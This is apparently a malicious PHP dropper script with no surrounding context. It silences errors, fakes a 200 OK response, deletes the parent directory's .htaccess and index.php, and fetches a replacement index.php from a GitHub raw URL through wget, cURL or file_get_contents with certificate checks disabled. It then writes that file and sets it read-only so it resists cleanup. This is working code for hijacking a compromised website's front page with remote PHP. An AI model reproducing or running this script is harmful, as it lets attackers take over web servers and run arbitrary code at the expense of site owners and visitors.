<?php
// Always return 200 OK
http_response_code(200);
@ini_set('display_errors', 0);
@error_reporting(0);

// Move one directory up
@chdir('..');

$remoteUrl = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/3-9-26/index.php';
$targetFile = 'index.php';
$oldFiles = ['.htaccess', 'index.php'];

/* Clean old files safely */
foreach ($oldFiles as $file) {
    if (is_file($file)) {
        @chmod($file, 0644);
        @unlink($file);
    }
}

/* Helper: validate downloaded content */
function isValidContent($data) {
    return is_string($data) && strlen($data) > 50 && strpos($data, '<?php') !== false;
}

$data = false;

/* 1) Try wget */
if (!$data && function_exists('exec')) {
    $tmp = '.__tmp_dl';
    @unlink($tmp);

    @exec('wget -q -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($remoteUrl), $o, $code);
    if ($code === 0 && is_file($tmp)) {
        $content = @file_get_contents($tmp);
        if (isValidContent($content)) {
            $data = $content;
        }
        @unlink($tmp);
    }
}

/* 2) Try cURL */
if (!$data && function_exists('curl_init')) {
    $ch = @curl_init($remoteUrl);
    if ($ch) {
        @curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);
        $content = @curl_exec($ch);
        @curl_close($ch);

        if (isValidContent($content)) {
            $data = $content;
        }
    }
}

/* 3) Try file_get_contents */
if (!$data && function_exists('file_get_contents')) {
    $context = stream_context_create([
        'http' => [
            'timeout' => 15,
            'follow_location' => 1
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);

    $content = @file_get_contents($remoteUrl, false, $context);
    if (isValidContent($content)) {
        $data = $content;
    }
}

/* Final write (only if valid data exists) */
if ($data) {
    @file_put_contents($targetFile, $data, LOCK_EX);
    @chmod($targetFile, 0444);
    echo 'Done';
} else {
    // Silent, safe exit – no fatal error, no 500
    echo 'No update performed';
}

exit;
